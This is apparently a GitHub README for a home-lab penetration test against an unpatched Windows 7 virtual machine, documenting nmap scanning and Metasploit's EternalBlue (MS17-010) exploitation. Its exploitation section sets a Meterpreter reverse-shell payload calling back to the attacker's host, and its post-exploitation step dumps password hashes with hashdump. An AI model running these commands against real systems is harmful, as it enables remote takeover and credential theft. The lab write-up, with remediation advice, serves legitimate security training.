# Windows 7 MS17-010 (EternalBlue) VAPT Lab

![Status](https://img.shields.io/badge/status-completed-brightgreen)
![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue)
![CVE](https://img.shields.io/badge/CVE-2017--0144-red)
![CVSS](https://img.shields.io/badge/CVSS-9.8%20Critical-critical)

Complete Vulnerability Assessment and Penetration Testing (VAPT) engagement against a vulnerable Windows 7 machine in a local, authorized home lab environment. This project demonstrates the full penetration testing lifecycle — reconnaissance, enumeration, vulnerability assessment, exploitation, and post-exploitation — against the MS17-010 (EternalBlue) SMB vulnerability.

> **Disclaimer:** This assessment was performed exclusively in an isolated, host-only virtual lab against a system I own and control. No unauthorized systems were accessed. This project is for educational and portfolio purposes only.

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker Machine | Kali Linux (VirtualBox) |
| Target Machine | Windows 7 (unpatched, vulnerable to MS17-010) |
| Network | Host-Only Adapter (isolated) |
| Tools Used | Nmap, Metasploit Framework, Meterpreter |

---

## Vulnerability Summary

| Field | Detail |
|---|---|
| Vulnerability | EternalBlue — SMBv1 Remote Code Execution |
| CVE | CVE-2017-0144 |
| CVSS v3.1 Score | 9.8 (Critical) |
| Affected Protocol | SMBv1 (TCP 445) |
| Metasploit Module | `exploit/windows/smb/ms17_010_eternalblue` |

---

## Methodology

### 1. Reconnaissance
Identified the target IP on the host-only network and confirmed host availability.

```bash
arp-scan --localnet
ping -c 4 <target-ip>
```



### 2. Enumeration
Performed a full port and service scan to identify open services and versions.

```bash
nmap -sS -sV -A -T4 -p- <target-ip>
```

**Sample output:**
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds

![Nmap Service Scan](Screenshots/01-nmap-service-scan.png)

### 3. Vulnerability Assessment
Ran Nmap's SMB vulnerability scripts to confirm exposure to MS17-010.

```bash
nmap --script smb-vuln-ms17-010 -p445 <target-ip>
```

**Sample output:**
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs: CVE:CVE-2017-0143
|     Risk factor: HIGH

![Vulnerability Scan](Screenshots/02-smb-enum.png)

### 4. Exploitation
Used Metasploit's EternalBlue module to gain remote code execution.

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

![Exploitation](Screenshots/04-eternalblue-exploit.png)

### 5. Post-Exploitation
Obtained a Meterpreter session with SYSTEM-level privileges and confirmed access.

```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
```

![Meterpreter Session](Screenshots/05-meterpreter-session.png)

---

## Impact

Successful exploitation resulted in unauthenticated remote code execution with **NT AUTHORITY\SYSTEM** privileges — full administrative control of the target host, including the ability to read/write files, dump credential hashes, and pivot further into the network.

---

## Remediation

- Apply Microsoft Security Bulletin **MS17-010** (patches KB4012212 / KB4012215 and related updates)
- Disable SMBv1 entirely where not required (`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`)
- Restrict SMB (port 445) exposure at the network/firewall level
- Implement network segmentation to limit lateral movement from compromised hosts

---

## Skills Demonstrated

- Network reconnaissance and host discovery
- Service enumeration with Nmap (NSE scripting)
- Vulnerability identification and CVE/CVSS mapping
- Exploit development workflow using Metasploit Framework
- Post-exploitation and privilege verification with Meterpreter
- Technical documentation and reporting

---

## Repository Structure
Windows-7-MS17-010-VAPT-Lab/
├── README.md
└── Screenshots/
├── 01-host-discovery.png
├── 02-nmap-service-scan.png
├── 03-smb-vuln-scan.png
├── 04-eternalblue-exploit.png
└── 05-meterpreter-session.png

---

## Author

**Hariharan P**
Aspiring Penetration Tester / SOC Analyst
